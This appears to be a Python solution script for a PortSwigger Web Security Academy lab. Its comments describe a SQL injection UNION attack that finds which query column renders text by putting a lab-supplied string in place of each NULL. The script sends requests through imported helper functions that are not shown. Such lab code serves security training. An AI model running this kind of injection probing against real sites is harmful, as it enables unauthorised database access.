# Lab 08 — SQL Injection UNION Attack: Finding a Column Containing Text
# PortSwigger: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
#
# Vulnerability: Product category filter
# Aim:           Identify which column(s) in the query accept and render string data
#
# Technique: Replace each NULL in the UNION SELECT with the target string one at a time.
#            When the string appears in the response, that column accepts strings.
#
# NOTE: The lab provides a random value you must inject — update RANDOM_VALUE below
#       before running. It changes each time the lab is started.
#
# Usage: python lab8.py <url>

import sys
import urllib3
from sqli_utils import check_vulnerability, banner, section, get_number_of_columns, find_text_column

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FILTER_PATH  = "filter"
RANDOM_VALUE = "UJ0iGL"   # ← update this to the value shown in the lab


if __name__ == "__main__":
    banner()
    section("LAB 08 — UNION: FIND STRING COLUMN")

    if len(sys.argv) != 2:
        print("  Usage: python lab8.py <url>")
        sys.exit(1)

    target = sys.argv[1].rstrip("/") + "/"

    if not check_vulnerability(target, FILTER_PATH):
        print("\n  ✘  Target does not appear vulnerable. Exiting.")
        sys.exit(1)

    col_num = get_number_of_columns(target, FILTER_PATH)
    if col_num is None:
        print("\n  ✘  Could not determine column count. Exiting.")
        sys.exit(1)

    find_text_column(target, col_num, random_value=RANDOM_VALUE, path=FILTER_PATH)
